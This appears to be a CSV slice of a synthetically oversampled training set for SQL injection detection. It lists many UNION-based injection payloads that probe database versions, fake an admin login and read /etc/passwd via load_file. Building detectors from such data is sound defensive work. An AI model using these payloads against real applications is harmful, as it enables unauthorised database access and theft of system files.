id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000030,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000071,0.2650065107160895
SMOTE_000031,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000018,0.8370201422444861
SMOTE_000032,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000030,0.41068418952938807
SMOTE_000033,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000051,0.06408841255267715
SMOTE_000034,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,2.0947819873683096
SMOTE_000035,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000014,0.8359924005063841
SMOTE_000036,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000020,0.8907960312726801
SMOTE_000037,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000026,0.26984048517891823
SMOTE_000038,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,0.8791927530209702
SMOTE_000039,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,0.6652682442710136
SMOTE_000040,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000057,0.4512636242748631
SMOTE_000041,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,1.1192181910501855
SMOTE_000042,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,0.6673556295556198
SMOTE_000043,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,0.4713076825934416
SMOTE_000044,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,0.287039120724004
SMOTE_000045,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000048,1.4767379810502814
SMOTE_000046,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.2758603044113123
SMOTE_000047,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,0.9830238525119193
SMOTE_000048,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,1.3482437068755244
SMOTE_000049,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000045,0.2335205268810916
SMOTE_000050,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000009,1.2902575038320863
SMOTE_000051,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000020,1.8212875509384898
SMOTE_000052,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,1.9256488863914285
SMOTE_000053,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000068,0.005416813224229057
SMOTE_000054,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,0.030719141662594665
SMOTE_000055,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,0.12985013748959984
SMOTE_000056,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,0.6623425432223845
SMOTE_000057,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,0.08767722507928707
SMOTE_000058,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,2.200431588491752
SMOTE_000059,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,0.7444706115008058
SMOTE_000060,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,0.9833763561239728
SMOTE_000061,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,0.20958557108203607
SMOTE_000062,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000011,0.1043272794877223
SMOTE_000063,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,0.00905816581661391
SMOTE_000064,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000020,0.16735625523905776
SMOTE_000065,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000049,0.31001366553733184
SMOTE_000066,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R000044,0.2709346129882218
SMOTE_000067,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000051,1.045480400392359
SMOTE_000068,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,0.7779771862671423
SMOTE_000069,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,0.7913322026777575
SMOTE_000070,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,1.0778757854951737
SMOTE_000071,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,1.8214731300138651
SMOTE_000072,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,0.7083572337622541
SMOTE_000073,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,1.7635966173865836
SMOTE_000074,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000007,3.23324229140642
SMOTE_000075,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.3301065054651467
SMOTE_000076,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,2.478769207400325
SMOTE_000077,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,0.5081042446293794
SMOTE_000078,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000018,0.30127412781896373
SMOTE_000079,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000042,1.0638100302357971
SMOTE_000080,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000056,0.6605887944677161
SMOTE_000081,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,0.35225852680395864
SMOTE_000082,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,0.059255405989053
SMOTE_000083,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000049,0.312163074226593
SMOTE_000084,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000062,0.3830782901438017
SMOTE_000085,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000032,0.7027288865625603
SMOTE_000086,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000049,1.2603739921658093
SMOTE_000087,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000013,2.2740788860957
SMOTE_000088,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,0.4590204741029344
SMOTE_000089,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.2680960336824148
SMOTE_000090,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,2.7833331998661133
SMOTE_000091,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,1.270414650928173
SMOTE_000092,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,1.9624164017950112
SMOTE_000093,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000035,0.6442178102493596
SMOTE_000094,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,0.41103719923017284
SMOTE_000095,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,0.22696973959469122
SMOTE_000096,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000031,0.0825553020018781
SMOTE_000097,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000025,0.9217071244154467
SMOTE_000098,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,1.1960486587605719
SMOTE_000099,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000049,1.4072078078325883
SMOTE_000100,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,1.3547916330095309
SMOTE_000101,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,0.6606576921681144
SMOTE_000102,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000042,0.7716886033753756
SMOTE_000103,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,1.5925034226479153
SMOTE_000104,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000050,0.3172145952742314
SMOTE_000105,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000014,2.3216360884361147
SMOTE_000106,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.36803522198028976
SMOTE_000107,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,1.1043349264460487
SMOTE_000108,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,0.3709898163694663
SMOTE_000109,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,1.576361181158048
SMOTE_000110,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000023,0.6794301775959881
SMOTE_000111,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000072,0.11230297641589333
SMOTE_000112,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000023,0.7765899026167976
SMOTE_000113,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,2.4493944141736987
SMOTE_000114,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,2.2614487567555157
SMOTE_000115,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000033,0.8047304742859178
SMOTE_000116,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,1.1308291860193322
SMOTE_000117,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,0.029741138515587857
SMOTE_000118,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,0.743482052471045
SMOTE_000119,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000055,1.4649600972307222
SMOTE_000120,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,0.20356172350141702
SMOTE_000121,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,1.8425818141583548
SMOTE_000122,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,0.016452119304386004
SMOTE_000123,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,6.698286553136319
SMOTE_000124,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,1.3965193119598123
SMOTE_000125,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,0.03952835627308994
SMOTE_000126,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000007,2.5615025630275903
SMOTE_000127,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,0.5354657527648161
SMOTE_000128,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,0.047330511804919706
SMOTE_000129,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000037,0.860013497111575
SMOTE_000130,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000042,1.2579113619597881
SMOTE_000131,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,0.5723927843345761
SMOTE_000132,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000018,1.430579025068665
SMOTE_000133,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000041,0.351015562454606
SMOTE_000134,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,0.9083650473849612
SMOTE_000135,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,0.2740909857479128
SMOTE_000136,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.33547096082680894
SMOTE_000137,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,4.284477360473372
SMOTE_000138,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,0.8302571723147494
SMOTE_000139,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,0.15517153841536718
SMOTE_000140,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000056,0.1453829660973937
SMOTE_000141,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,0.6936074550829039
SMOTE_000142,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000037,0.702093778712626
SMOTE_000143,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,0.7405345480277956
SMOTE_000144,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000035,0.0003174620935213985
SMOTE_000145,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,0.0765866332449273
SMOTE_000146,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,0.13865923547248185
SMOTE_000147,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,1.9382464494378882
SMOTE_000148,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,0.3681318905639335
SMOTE_000149,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,1.120345800086262
SMOTE_000150,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,0.4516672744727816
SMOTE_000151,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,0.16587131173296346
SMOTE_000152,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000011,0.3309812670316873
SMOTE_000153,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,0.9608117588954075
SMOTE_000154,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,1.584265140278127
SMOTE_000155,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.29810517893243976
SMOTE_000156,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,0.198391992673646
SMOTE_000157,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,0.388048574875783
SMOTE_000158,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.36479028186293705
SMOTE_000159,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000057,0.29326385940271243
SMOTE_000160,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000045,0.06103921807156046
SMOTE_000161,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000032,0.554451069432408
SMOTE_000162,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,0.289040726568095
SMOTE_000163,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000056,0.11842625072839959
SMOTE_000164,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,0.28139820932620746
SMOTE_000165,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,0.8355478175976796
SMOTE_000166,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000024,0.7610872599301143
SMOTE_000167,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000026,0.1264683506289926
SMOTE_000168,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,0.18056964552654087
SMOTE_000169,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000006,0.9373568400445991
SMOTE_000170,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000024,0.8503668607189835
SMOTE_000171,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,0.33546375981260923
SMOTE_000172,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000050,0.5706331239635936
SMOTE_000173,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,0.5614239490340408
SMOTE_000174,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,0.009086199927595729
SMOTE_000175,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R000044,0.8439973458398251
SMOTE_000176,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000020,4.7013651816665964
SMOTE_000177,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000041,0.21381507674595976
SMOTE_000178,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.12604200854664718
SMOTE_000179,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,1.1907809103742417
SMOTE_000180,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,0.03460843006547134
